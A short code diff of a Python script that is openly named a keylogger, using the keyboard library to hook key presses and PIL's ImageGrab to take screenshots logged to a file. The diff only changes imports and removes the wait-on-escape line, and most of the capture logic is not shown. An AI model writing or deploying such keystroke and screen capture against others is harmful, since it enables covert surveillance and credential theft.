@@ -1,8 +1,6 @@
 import keyboard
 from PIL import ImageGrab
 import datetime
-import sys
-import os
 
 
 def keylogger():
@@ -33,7 +31,8 @@ def on_key(event):
             file.write(f" Screenshot Save\n")
 
 keyboard.on_press(on_key)
-keyboard.wait('esc')
+
 
 if __name__ == '__main__':
     keylogger()
+    
